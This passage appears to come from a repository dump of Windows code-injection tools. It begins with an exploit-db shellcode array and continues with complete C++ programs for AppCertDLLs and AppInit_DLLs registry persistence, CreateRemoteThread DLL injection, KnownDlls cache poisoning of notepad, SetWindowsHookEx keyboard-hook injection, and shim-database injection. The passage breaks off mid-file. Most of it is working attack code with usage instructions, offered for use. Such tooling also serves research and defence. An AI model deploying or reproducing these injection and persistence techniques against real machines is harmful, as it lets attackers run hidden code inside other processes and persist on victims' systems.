"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

#else
// https://www.exploit-db.com/exploits/37758
// this is 32 bit shellcode
char shellcode[] = "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
    "\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
    "\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
    "\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
    "\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
    "\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
    "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
    "\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
    "\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
    "\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
    "\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
    "\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
    "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
    "\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
    "\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
    "\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
    "\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
    "\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
    "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
    "\x69\x74\x54\x53\xff\xd6\x57\xff\xd0";
#endif
```

`pe_injection/dll_injection/appcertdlls_injection.cpp`:

```cpp
/**
* Injects a .dll into every process that calls: CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec by writing it to the AppCertDLLs registry key.
* Supports 32- and 64 Bit applications.
* [Requirements] 
*	- elevated priviledges
* [WARNING]
*	Some dll payloads (such as the one in this project) may couse a CRITICAL_PROCESS_DIED bluescreens, even with safe mode enabled.
*	The easiest way to fix the system in such a case is to delete the .dll file on disk. This can for example be done by booting into the commandline only environment.
*/

#include <Windows.h>
#include <iostream>


bool IsElevated()
{
	HANDLE tokenHandle = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle))
	{
		return false;
	}

	TOKEN_ELEVATION tokenInformation;
	DWORD returnLength;
	if (!GetTokenInformation(tokenHandle, TokenElevation, &tokenInformation, sizeof(tokenInformation), &returnLength))
	{
		CloseHandle(tokenHandle);
		return false;
	}

	CloseHandle(tokenHandle);
	return tokenInformation.TokenIsElevated;
}

bool IsOsVersionBelowWindows8()
{
	using fnRtlGetVersion = NTSTATUS(NTAPI*)(PRTL_OSVERSIONINFOW lpVersionInformation);

	HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
	if (!ntdllHandle)
	{
		printf("[Warning] %d - Failed to get ntdll handle\n", GetLastError());
		return false;
	}

	fnRtlGetVersion RtlGetVersion = (fnRtlGetVersion)GetProcAddress(ntdllHandle, "RtlGetVersion");

	RTL_OSVERSIONINFOW osInfo;
	RtlGetVersion(&osInfo);
	return osInfo.dwMajorVersion < 8 ? true : false;
}

int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: *.exe dllPath\n");
		return 1;
	}

	if (!IsElevated())
	{
		printf("[Error] - Writing AppInit_DLLs requires elevated privileges\n");
		return 1;
	}

	HKEY keyHandle;
	RegCreateKeyA(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs", &keyHandle);
	if (!keyHandle)
	{
		printf("[Error] - Failed to create/open registry key\n");
		return 1;
	}

	char absoluteDllPath[MAX_PATH + 1];
	GetFullPathNameA(argv[1], MAX_PATH + 1, absoluteDllPath, NULL);
	if (RegSetValueExA(keyHandle, "appcertdllInjection", 0, REG_SZ, (const BYTE*)absoluteDllPath, strlen(absoluteDllPath) + 1) != ERROR_SUCCESS)
	{
		printf("[Error] - Failed to write dll path to AppCertDLLs\n");
		return 1;
	}

	printf("[Info] - Wrote AppCertDLLs registry key\n");

	return 0;
}
```

`pe_injection/dll_injection/appinitdlls_injection.cpp`:

```cpp
/**
* Injects a .dll into every process that uses user32.dll by writing it to the AppInit_DLLs registry key.
* Supports 32- and 64 Bit applications.
* [Warning] Feature is disabled on Windows 8 and newer with secure boot enabled: https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls.
* [Requirements] https://docs.microsoft.com/en-us/windows/win32/win7appqual/appinit-dlls-in-windows-7-and-windows-server-2008-r2?redirectedfrom=MSDN
* - elevated priviledges
*/

#include <Windows.h>
#include <iostream>


bool IsElevated()
{
	HANDLE tokenHandle = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle))
	{
		return false;
	}

	TOKEN_ELEVATION tokenInformation;
	DWORD returnLength;
	if (!GetTokenInformation(tokenHandle, TokenElevation, &tokenInformation, sizeof(tokenInformation), &returnLength))
	{
		CloseHandle(tokenHandle);
		return false;
	}

	CloseHandle(tokenHandle);
	return tokenInformation.TokenIsElevated;
}

bool IsOsVersionBelowWindows8()
{
	using fnRtlGetVersion = NTSTATUS(NTAPI*)(PRTL_OSVERSIONINFOW lpVersionInformation);

	HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
	if (!ntdllHandle)
	{
		printf("[Warning] %d - Failed to get ntdll handle\n", GetLastError());
		return false;
	}

	fnRtlGetVersion RtlGetVersion = (fnRtlGetVersion)GetProcAddress(ntdllHandle, "RtlGetVersion");

	RTL_OSVERSIONINFOW osInfo;
	RtlGetVersion(&osInfo);
	return osInfo.dwMajorVersion < 8 ? true : false;
}

int main(int argc, char* argv[])
{
	bool wowInjeciton = false;
	if (argc >= 2)
	{
		argc == 3 ? wowInjeciton = atoi(argv[2]) : wowInjeciton = false;
	}
	else
	{
		printf("Usage: *.exe dllPath [bWoW64Injection]\n");
		return 1;
	}

	if (!IsElevated())
	{
		printf("[Error] - Writing AppInit_DLLs requires elevated privileges\n");
		return 1;
	}

	if (!IsOsVersionBelowWindows8())
	{
		printf("[Warning] - Could not determine if Windows version is below 8. Starting with Windows 8 and secure boot enabled this method does not work.\n");
	}

	DWORD loadDlls = 1;
	char absoluteDllPath[MAX_PATH + 1];
	GetFullPathNameA(argv[1], MAX_PATH + 1, absoluteDllPath, NULL);

	if (!wowInjeciton)
	{
		HKEY keyHandle;
		RegOpenKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", &keyHandle);

		if (!keyHandle)
		{
			printf("[Error] - Failed to open registry key\n");
			return 1;
		}

		// 32bit/64bit
		
		if (RegSetValueExA(keyHandle, "LoadAppInit_DLLs", 0, REG_DWORD, (const BYTE*)&loadDlls, sizeof(DWORD)) != ERROR_SUCCESS)
		{
			printf("[Error] - Failed to write dll path to AppInit_DLLs\n");
			return 1;
		}

		printf("[Info] - Wrote LoadAppInit_DLLs for 32bit/64bit\n");

		
		if (RegSetValueExA(keyHandle, "AppInit_DLLs", 0, REG_SZ, (const BYTE*)absoluteDllPath, strlen(absoluteDllPath) + 1) != ERROR_SUCCESS)
		{
			printf("[Error] - Failed to write dll path to AppInit_DLLs\n");
			return 1;
		}

		printf("[Info] - Wrote AppInit_DLLs for 32bit/64bit\n");
	}
#ifdef _WIN64
	if (wowInjeciton)
	{
		// WoW64
		HKEY wow64KeyHandle;
		RegOpenKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows", &wow64KeyHandle);

		if (!wow64KeyHandle)
		{
			printf("[Error] - Failed to open registry key\n");
			return 1;
		}

		if (RegSetValueExA(wow64KeyHandle, "LoadAppInit_DLLs", 0, REG_DWORD, (const BYTE*)&loadDlls, sizeof(DWORD)) != ERROR_SUCCESS)
		{
			printf("[Error] - Failed to write dll path to AppInit_DLLs\n");
			return 1;
		}

		printf("[Info] - Wrote LoadAppInit_DLLs for WoW64\n");

		if (RegSetValueExA(wow64KeyHandle, "AppInit_DLLs", 0, REG_SZ, (const BYTE*)absoluteDllPath, strlen(absoluteDllPath) + 1) != ERROR_SUCCESS)
		{
			printf("[Error] - Failed to write dll path to AppInit_DLLs\n");
			return 1;
		}

		printf("[Info] - Wrote AppInit_DLLs for WoW64\n");
	}
#endif
	

	return 0;
}
```

`pe_injection/dll_injection/classic_dll_injection.cpp`:

```cpp
/**
* Injects a .dll file into a running process
* Supports 32- and 64 Bit applications.
* [Requirements]
*	- DLL file on disk
*/

#include <Windows.h>
#include <string>
#include <cstdio>
#include <tlhelp32.h>


int main(int argc, char* argv[])
{
	char* processName;

	if (argc != 3)
	{
		printf("Usage: *.exe processName dllPath\n");
		return 1;
	}

	processName = argv[1];
	
	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("[Error] %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;
	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("[Error] - Failed to find process: %s\n", processName);
		return 1;
	}

	printf("[Info] - Found Process %s with id %d\n", processName, processEntry.th32ProcessID);

	// acquire a handle to the target process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	// allocate memory in target process
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, nullptr, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	DWORD loadDlls = 1;
	char absoluteDllPath[MAX_PATH + 1];
	GetFullPathNameA(argv[2], MAX_PATH + 1, absoluteDllPath, NULL);
	// write path of .dll to target process
	if (!WriteProcessMemory(targetProcessHandle, remoteMemory, absoluteDllPath, strlen(absoluteDllPath), nullptr))
	{
		printf("[Error] %d - Failed to write .dll path to target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote dll path %s to target process %s \n", absoluteDllPath, processName);

	// get handle to kernel32.dll (which is loaded by default)
	HMODULE kernel32ModuleHandle = GetModuleHandle("kernel32.dll");
	if (!kernel32ModuleHandle)
	{
		printf("[Error] %d - Failed to get kernel32 module handle\n", GetLastError());
		return 1;
	}

	// resolve address of LoadLibraryA
	FARPROC kernel32LoadLibrary = GetProcAddress(kernel32ModuleHandle, "LoadLibraryA");
	if (!kernel32LoadLibrary)
	{
		printf("[Error] %d - Failed to resolve LoadLibraryA\n", GetLastError());
		return 1;
	}

	printf("[Info] - Found LoadLibraryA at %p\n", kernel32LoadLibrary);

	// create a thread in the target process which loads the .dll
	HANDLE remoteThreadHandle = CreateRemoteThread(
		targetProcessHandle,
		nullptr,
		NULL,
		reinterpret_cast<LPTHREAD_START_ROUTINE>(kernel32LoadLibrary),
		remoteMemory,
		NULL,
		nullptr
	);

	if (!remoteThreadHandle)
	{
		printf("[Error] %d - Failed to CreateRemoteThread\n", GetLastError());
		return 1;
	}

	printf("[Info] - Created remote thread at %p\n", kernel32LoadLibrary);

	CloseHandle(remoteThreadHandle);
	CloseHandle(targetProcessHandle);
}
```

`pe_injection/dll_injection/knowndllscache_injection.cpp`:

```cpp
/**
* Injects a .dll into notepad.exe by poisoning the KnownDlls cache to load a malicious dll instead of a benign
* The current implementation does not support 32bit or WoW64
* We can use any dll that is loaded into the process for the first time when doing a specific action and is a KnownDll.
*  examples found using x64 dbg log: 
	ole32.dll		- Loaded when typing into the notepad file
	comdlg32.dll	- Loaded when saving the document
	nsi.dll			- Loaded when printing the document
* based on: https://www.codeproject.com/Articles/325603/Injection-into-a-Process-Using-KnownDlls, https://modexp.wordpress.com/2019/08/12/windows-process-injection-knowndlls/
*/

#include <Windows.h>
#include <iostream>
#include <vector>

#include "../../common/ntddk.h"


// from https://github.com/frk1/PolandCheater-perfecthook/blob/master/PerfectHook/Utilities.cpp
BYTE* FindBytePattern(const char* module, const char* signature)
{
	static auto ConvertPatternToBytes = [](const char* pattern) 
	{
		std::vector<int> bytes = std::vector<int>{};
		char* start = const_cast<char*>(pattern);
		char* end = const_cast<char*>(pattern) + strlen(pattern);

		for (char* current = start; current < end; ++current)
		{
			if (*current == '?') 
			{
				++current;
				if (*current == '?')
				{
					++current;
				}
				bytes.push_back(-1);
			}
			else 
			{
				bytes.push_back(strtoul(current, &current, 16));
			}
		}
		return bytes;
	};

	BYTE* moduleBaseAddress = (BYTE*)GetModuleHandleA(module);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBaseAddress;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((std::uint8_t*)moduleBaseAddress + dosHeader->e_lfanew);

	auto sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
	auto patternBytes = ConvertPatternToBytes(signature);
	uint8_t* currentAddress = reinterpret_cast<uint8_t*>(moduleBaseAddress);

	int patternSize = patternBytes.size();
	int* patternData = patternBytes.data();

	for (int i = 0; i < sizeOfImage - patternSize; ++i)
	{
		bool found = true;
		for (int j = 0; j < patternSize; ++j)
		{
			if (currentAddress[i + j] != patternData[j] && patternData[j] != -1)
			{
				found = false;
				break;
			}
		}
		if (found) 
		{
			return &currentAddress[i];
		}
	}
	return nullptr;
}


bool PoisonKnownDllsCache(DWORD pid, char* payloadDll, wchar_t* originalKnownDll)
{
	// open process for duplicating handle, suspending/resuming process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire notepad.exe process handle\n", GetLastError());
		return false;
	}

	// we can search for this address in our own process since ASLR will be the same in the target process for ntdll
	// ntdll Windows 10
	//	8D 51 01                lea     edx, [rcx+1]
	//	48 8D 0D 93 76 09 00    lea     rcx, LdrpKnownDllDirectoryHandle
	BYTE* LdrpKnownDllDirectoryHandle = FindBytePattern("ntdll.dll", "8D 51 01 48 8D 0D");
	
	if (!LdrpKnownDllDirectoryHandle)
	{
		// failed to find LdrpKnownDllDirectoryHandle address using Windows 10 byte pattern. Attempt Windows 7 x64 bye pattern next
		// ntdll Windows 7 x64
		//	8D 56 D3                lea     edx, [rsi - 2Dh]
		//	48 8D 0D C7 F7 0F 00    lea     rcx, LdrpKnownDllDirectoryHandle
		LdrpKnownDllDirectoryHandle = FindBytePattern("ntdll.dll", "8D 56 D3");
		if (!LdrpKnownDllDirectoryHandle)
		{
			printf("[Error] - Failed to find LdrpKnownDllDirectoryHandle in ntdll using Win10 and Win7 byte patterns\n");
			return false;
		}
	}
	
	// + 0x6 to skip the bytes of the previous instruction and the op code before the actual offset value
	int32_t relativeOffset = *(int32_t*)(LdrpKnownDllDirectoryHandle + 0x6);

	// + 0xA because the offset is relative from the start of the next instruction
	BYTE* originalKnownDllsHandleOffset = LdrpKnownDllDirectoryHandle + relativeOffset + 0xA;

	// note: there are methods to get this handle without RPM. For example to iterate over all handles and comparing for with "KnownDlls" name: NtQuerySystemInformation --> NtQueryObject: ObjectNameInformation
	HANDLE originalKnownDllsHandle;
	if (!ReadProcessMemory(targetProcessHandle, originalKnownDllsHandleOffset, &originalKnownDllsHandle, sizeof(HANDLE), nullptr))
	{
		printf("[Error] - Failed to read original KnownDlls handle from notepad process\n");
		return false;
	}

	printf("[Info] - originalKnownDllsHandle %p\n", originalKnownDllsHandle);

	// create directory
	HANDLE directoryHandle;
	OBJECT_ATTRIBUTES directoryAttributes;
	InitializeObjectAttributes(&directoryAttributes, NULL, 0, NULL, NULL);
	NTSTATUS status = NtCreateDirectoryObject(&directoryHandle, DIRECTORY_ALL_ACCESS, &directoryAttributes);

	// convert payload path to ntpath
	OBJECT_ATTRIBUTES fileAttributes;
	UNICODE_STRING fileName;
	wchar_t payloadDllW[MAX_PATH + 1];
	mbstowcs_s(nullptr, payloadDllW, strlen(payloadDll) + 1, payloadDll, MAX_PATH);
	RtlDosPathNameToNtPathName_U(payloadDllW, &fileName, NULL, NULL);
	InitializeObjectAttributes(&fileAttributes, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// open payload file
	HANDLE fileHandle;
	IO_STATUS_BLOCK ioStatusBlock;
	status = NtOpenFile(&fileHandle, FILE_GENERIC_READ | FILE_GENERIC_WRITE | FILE_GENERIC_EXECUTE, &fileAttributes, &ioStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);

	// convert KnownDll name to unicode
	OBJECT_ATTRIBUTES sectionAttributes;
	UNICODE_STRING sectionName;
	RtlInitUnicodeString(&sectionName, originalKnownDll);
	InitializeObjectAttributes(&sectionAttributes, &sectionName, OBJ_CASE_INSENSITIVE, directoryHandle, NULL);

	// create section with the name of the KnownDll.
	// the loader will search for a section named \KnownDlls\<originalDllName> and map it into the process before continuing the regular search order 
	HANDLE sectionHandle;
	status = NtCreateSection(&sectionHandle, SECTION_ALL_ACCESS, &sectionAttributes, NULL, PAGE_EXECUTE, SEC_IMAGE, fileHandle);

	// close the KnownDlls handle in remote process
	HANDLE duplicatedKnownDlls;
	if (!DuplicateHandle(targetProcessHandle, originalKnownDllsHandle, GetCurrentProcess(), &duplicatedKnownDlls, 0, TRUE, DUPLICATE_CLOSE_SOURCE))
	{
		printf("[Error] - Failed to DuplicateHandle KnownDlls\n");
		return false;
	}

	// we don't care about the duplicated handle. We just wanted to close the original one
	CloseHandle(duplicatedKnownDlls);

	// duplicate object directory for remote process
	HANDLE duplicatedDirectory;
	if (!DuplicateHandle(GetCurrentProcess(), directoryHandle, targetProcessHandle, &duplicatedDirectory, 0, TRUE, DUPLICATE_SAME_ACCESS))
	{
		printf("[Error] - Failed to DuplicateHandle directory\n");
		return false;
	}

	CloseHandle(targetProcessHandle);

	printf("[Info] - Type anything into the notepad to inject the payload dll\n");
	return true;
}

bool PrintKnownDlls() 
{
	HKEY  knownDllsKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs", 0, KEY_READ | KEY_QUERY_VALUE, &knownDllsKey))
	{
		printf("[Warning] - Failed to open KnownDLLs registry key\n");
		return false;
	}

	printf("[Info] - KnownDlls\n");

	char name[MAX_PATH+1];
	char valueName[MAX_PATH+1];
	DWORD valueNameLength = MAX_PATH;
	DWORD namelen = MAX_PATH;
	int index = 0;
	while (!RegEnumValue(knownDllsKey, index++, valueName, &valueNameLength, NULL, NULL, (BYTE*)name, &namelen))
	{
		printf("\t%s\n", name);
		valueNameLength = MAX_PATH;
		namelen = MAX_PATH;
	}
	RegCloseKey(knownDllsKey);
	return true;
}

int main(int argc, char* argv[])
{
#ifdef _WIN64
#else
	printf("[Error] - The current implementation only supports 64 bit due to not being able to aquire the needed KnownDlls handle in 32bit\n");
	return 1;
#endif
	char* cmdLine = "notepad";

#ifdef _DEBUG
	PrintKnownDlls();
#endif

	if (argc != 2)
	{
		printf("Usage: *.exe dllPath\n");
		return 1;
	}

	STARTUPINFO startupInfo = {};
	PROCESS_INFORMATION processInformation;
	if (!CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInformation))
	{
		printf("[Error] %d - Failed to create notepad process\n", GetLastError());
		return 1;
	}

	char absoluteDllPath[MAX_PATH + 1];
	GetFullPathNameA(argv[1], MAX_PATH + 1, absoluteDllPath, NULL);
	if (!PoisonKnownDllsCache(processInformation.dwProcessId, absoluteDllPath, L"ole32.dll"))
	{
		printf("[Error] - Failed KnownDlls cache poisoning\n");
		return 1;
	}

	printf("[Info] - Press any key to remove injection. We need to keep this process alive so the created section and object directory are valid\n");
	getchar();

	CloseHandle(processInformation.hThread);
	CloseHandle(processInformation.hProcess);
	return 0;
}

```

`pe_injection/dll_injection/setwindowshook_injection.cpp`:

```cpp
/**
* DLL injection using SetWindowsHookEx. Triggering the injection requires key presses.
* Ensure you trigger injection on a program with the correct architecture (x86, x64).
* Supports 32- and 64 Bit applications.
* [Requirements]
*	- target process must load user32.dll
*/

#include <Windows.h>
#include <cstdio>


int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: *.exe dllPath\n");
		return 1;
	}

	char absoluteDllPath[MAX_PATH + 1];
	GetFullPathNameA(argv[1], MAX_PATH + 1, absoluteDllPath, NULL);

	// load library to be injected
	HMODULE dllHandle = LoadLibrary(absoluteDllPath);
	if (!dllHandle) 
	{
		printf("[Error] %d - Failed to load dll %s\n", GetLastError(), absoluteDllPath);
		return 1;
	}

	printf("[Info] - Loaded library %s\n", absoluteDllPath);

	// resolve SetWindowsHookCallback
	HOOKPROC windowsHookCallback = (HOOKPROC)GetProcAddress(dllHandle, "SetWindowsHookCallback");
	if (!windowsHookCallback)
	{
		printf("[Error] %d - Failed to resolve the SetWindowsHookCallback\n", GetLastError());
		return 1;
	}

	printf("[Info] - Resolved SetWindowsHook callback\n");

	// install the hook
	HHOOK hookHandle = SetWindowsHookExA(WH_KEYBOARD, windowsHookCallback, dllHandle, 0);
	if (!hookHandle)
	{
		printf("[Error] %d - Failed to install hook\n", GetLastError());
		return 1;
	}

	printf("[Info] - Installed hook\n");
	printf("[Info] - Press any key to uhook\n");

	// wait for a character press to unhook
	getchar();

	// unhook
	UnhookWindowsHookEx(hookHandle);

	return 0;
}
```

`pe_injection/dll_injection/shim_injection.cpp`:

```cpp
/** Creates a shim database(.sdb) file the database can be installed using the "sdbinst <*.sdb>" command which requires elevated privileges

* Windows 7 64 bit (copy payload_dll.dll to: C:\Windows\AppPatch\AppPatch64\dll_payload.dll)
* Windows 7 32bit works only using "Compatability Adminstrator 32 bit" and not on calc.exe (tested working with x32dbg.exe, pafish.exe)
*  - own implementation loads dll (sysinternals ProcMon) but crashes process
* Windows 10 WoW64 works when using the "Compatability Adminstrator 32 bit" to apply the "InjectDll" fix. That fix is not available in 64 bit.
*  - own implemenation does not load dll
* [Requirements]
*   - elevated privileges to installs shim
* Based on: https://gist.github.com/w4kfu/95a87764db7029e03f09d78f7273c4f4, https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf
*/

// sdbinst creates registry keys:
//  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom
//  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB

// default file paths
//  C:\Windows\AppPatch\*.dll
//  C:\Windows\AppPatch\AppPatch64\*.dll
//  C:\Windows\AppPatch\Custom\*.sdb
//  C:\Windows\AppPatch\Custom\Custom64\*.sdb


#include <windows.h>
#include <stdio.h>

#ifdef _WIN64
#define OS_PLATFORM         4 
#else
#define OS_PLATFORM         1   
#endif

#define TAGID_NULL          0

#define TAG_TYPE_LIST       0x7000
#define TAG_DATABASE        (0x1 | TAG_TYPE_LIST)
#define TAG_LIBRARY         (0x2 | TAG_TYPE_LIST)
#define TAG_INEXCLUDE       (0x3 | TAG_TYPE_LIST)
#define TAG_SHIM            (0x4 | TAG_TYPE_LIST)
#define TAG_EXE             (0x7 | TAG_TYPE_LIST)
#define TAG_MATCHING_FILE   (0x8 | TAG_TYPE_LIST)
#define TAG_SHIM_REF        (0x9 | TAG_TYPE_LIST)

#define TAG_TYPE_DWORD      0x4000
#define TAG_OS_PLATFORM     (0x23| TAG_TYPE_DWORD)

#define TAG_TYPE_STRINGREF  0x6000
#define TAG_NAME            (0x1 | TAG_TYPE_STRINGREF)
#define TAG_MODULE          (0x3 | TAG_TYPE_STRINGREF)
#define TAG_APP_NAME        (0x6 | TAG_TYPE_STRINGREF)
#define TAG_DLLFILE         (0xA | TAG_TYPE_STRINGREF)

#define TAG_TYPE_BINARY     0x9000
#define TAG_EXE_ID          (0x4 | TAG_TYPE_BINARY)
#define TAG_DATABASE_ID     (0x7 | TAG_TYPE_BINARY)

#define TAG_TYPE_NULL       0x1000
#define TAG_INCLUDE         (0x1 | TAG_TYPE_NULL)

typedef enum _PATH_TYPE {
    DOS_PATH,
    NT_PATH
} PATH_TYPE;

typedef HANDLE PDB;
typedef DWORD TAG;
typedef DWORD INDEXID;
typedef DWORD TAGID;

using fnSdbCreateDatabase = PDB(WINAPI*)(LPCWSTR, PATH_TYPE);
using fnSdbCloseDatabaseWrite = VOID(WINAPI*)(PDB);
using fnSdbBeginWriteListTag = TAGID(WINAPI*)(PDB, TAG);
using fnSdbEndWriteListTag = BOOL(WINAPI*)(PDB, TAGID);
using fnSdbWriteStringTag = BOOL(WINAPI*)(PDB, TAG, LPCWSTR);
using fnSdbWriteDWORDTag = BOOL(WINAPI*)(PDB, TAG, DWORD);
using fnSdbWriteBinaryTag = BOOL(WINAPI*)(PDB, TAG, PBYTE, DWORD);
using fnSdbWriteNULLTag = BOOL(WINAPI*)(PDB, TAG);

fnSdbBeginWriteListTag SdbBeginWriteListTag = nullptr;
fnSdbCloseDatabaseWrite SdbCloseDatabaseWrite = nullptr;
fnSdbCreateDatabase SdbCreateDatabase = nullptr;
fnSdbEndWriteListTag SdbEndWriteListTag = nullptr;
fnSdbWriteBinaryTag SdbWriteBinaryTag = nullptr;
fnSdbWriteDWORDTag SdbWriteDWORDTag = nullptr;
fnSdbWriteStringTag SdbWriteStringTag = nullptr;
fnSdbWriteNULLTag SdbWriteNULLTag = nullptr;

bool CreateApplicationCompatibilityDatabase(wchar_t* processNameW, wchar_t* dllNameW)
{
    PDB shimdb = SdbCreateDatabase(L"shim_injection.sdb", DOS_PATH);
    if (!shimdb)
    {
        printf("[Error] %d - Failed to create compatability database\n", GetLastError());
        return false;
    }

    char binaryTag[] = "AAAAAAAAAAAAAAAA";
    char tagDatabaseid[] = "BBBBBBBBBBBBBBBB";

    TAGID tIdDatabase = SdbBeginWriteListTag(shimdb, TAG_DATABASE);
    SdbWriteDWORDTag(shimdb, TAG_OS_PLATFORM, OS_PLATFORM);
    SdbWriteStringTag(shimdb, TAG_NAME, L"shim_injection_database");
    SdbWriteBinaryTag(shimdb, TAG_DATABASE_ID, (BYTE*)tagDatabaseid, strlen(tagDatabaseid));

    TAGID tIdLibrary = SdbBeginWriteListTag(shimdb, TAG_LIBRARY);
    TAGID tIdShim = SdbBeginWriteListTag(shimdb, TAG_SHIM);
    SdbWriteStringTag(shimdb, TAG_NAME, L"shim_injection_shim");
    SdbWriteStringTag(shimdb, TAG_DLLFILE, dllNameW);

    TAGID tIdInexclude = SdbBeginWriteListTag(shimdb, TAG_INEXCLUDE);
    SdbWriteNULLTag(shimdb, TAG_INCLUDE);
    SdbWriteStringTag(shimdb, TAG_MODULE, L"*");
    SdbEndWriteListTag(shimdb, tIdInexclude);
    SdbEndWriteListTag(shimdb, tIdShim);
    SdbEndWriteListTag(shimdb, tIdLibrary);

    TAGID tIdExe = SdbBeginWriteListTag(shimdb, TAG_EXE);
    SdbWriteStringTag(shimdb, TAG_NAME, processNameW);
    SdbWriteStringTag(shimdb, TAG_APP_NAME, L"shim_injection_apps");
    SdbWriteBinaryTag(shimdb, TAG_EXE_ID, (BYTE*)binaryTag, strlen(binaryTag));

    TAGID tIdMatchingFile = SdbBeginWriteListTag(shimdb, TAG_MATCHING_FILE);
    SdbWriteStringTag(shimdb, TAG_NAME, L"*");
    SdbEndWriteListTag(shimdb, tIdMatchingFile);

    TAGID tIdShimRef = SdbBeginWriteListTag(shimdb, TAG_SHIM_REF);
    SdbWriteStringTag(shimdb, TAG_NAME, L"shim_injection_shim");
    SdbEndWriteListTag(shimdb, tIdShimRef);
    SdbEndWriteListTag(shimdb, tIdExe);
    SdbEndWriteListTag(shimdb, tIdDatabase);
    SdbCloseDatabaseWrite(shimdb);
    return TRUE;
}

int main(int argc, char* argv[])
{
#ifdef _WIN64
#else
    printf("[Error] - The current implementation only supports 64 bit\n");
    return 1;
#endif

    if (argc != 3)
    {
        printf("Usage: *.exe processName dllPath\n");
        return 1;
    }

    wchar_t processNameW[MAX_PATH + 1];
    mbstowcs_s(nullptr, processNameW, strlen(argv[1]) + 1, argv[1], MAX_PATH);

    wchar_t payloadDllW[MAX_PATH + 1];
    mbstowcs_s(nullptr, payloadDllW, strlen(argv[2]) + 1, argv[2], MAX_PATH);

    HMODULE appHelpDllHandle = LoadLibraryA("apphelp.dll");
    if (!appHelpDllHandle) 
    {
        printf("[Error] %d - Failed to load apphelp.dll\n", GetLastError());
        return 1;
    }
    
    // resolve required Sdb API functions
    // https://docs.microsoft.com/en-us/windows/win32/devnotes/application-compatibility-database
    SdbBeginWriteListTag = (fnSdbBeginWriteListTag)GetProcAddress(appHelpDllHandle, "SdbBeginWriteListTag");
    SdbCloseDatabaseWrite = (fnSdbCloseDatabaseWrite)GetProcAddress(appHelpDllHandle, "SdbCloseDatabaseWrite");
    SdbCreateDatabase = (fnSdbCreateDatabase)GetProcAddress(appHelpDllHandle, "SdbCreateDatabase");
